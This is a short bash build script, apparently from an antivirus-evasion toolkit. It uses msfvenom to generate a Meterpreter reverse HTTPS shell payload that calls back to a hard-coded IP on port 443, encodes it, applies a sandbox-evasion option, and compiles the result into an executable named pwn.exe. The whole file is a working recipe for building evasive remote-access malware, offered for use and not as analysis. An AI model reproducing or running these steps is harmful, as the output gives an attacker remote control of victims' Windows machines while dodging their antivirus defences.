#!/bin/bash          
# simple example script for building the .exe file
# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh
# make meterpreter reverse payload, encoded with msf alpha_mixed 
# additionaly to the avet encoder, further encoding should be used
msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.142 lport=443 -e x86/alpha_mixed -f c -a x86 --platform Windows > sc.txt
# call make_avet, the -f compiles the shellcode to the exe file, the -F is for the AV sandbox evasion 
./make_avet -f sc.txt -F 
# compile to pwn.exe file
$win32_compiler -o pwn.exe avet.c
# cleanup
rm sc.txt && echo "" > defs.h
